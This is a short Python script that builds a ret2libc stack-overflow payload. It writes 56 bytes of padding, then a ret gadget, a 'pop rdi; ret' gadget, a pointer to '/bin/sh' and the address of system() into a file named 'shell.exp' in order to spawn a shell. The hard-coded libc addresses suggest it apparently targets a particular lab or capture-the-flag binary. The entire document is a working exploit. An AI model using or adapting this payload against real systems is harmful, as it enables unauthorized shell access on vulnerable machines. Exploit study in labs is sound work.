#!/usr/bin/env python3

from struct import *


if __name__ == '__main__':
	buf = b'A'*56
	buf += pack('<Q', 0x7ffff7d1b9fb)  # ret;
	buf += pack('<Q', 0x7ffff7d1b9fa)  # pop rdi; ret;
	buf += pack('<Q', 0x7ffff7ddb799)  # pointer to "/bin/sh" gets popped into rdi
	buf += pack('<Q', 0x7ffff7c5c2e0)  # address of system()

	with open('shell.exp', 'wb+') as f:
		f.write(buf)
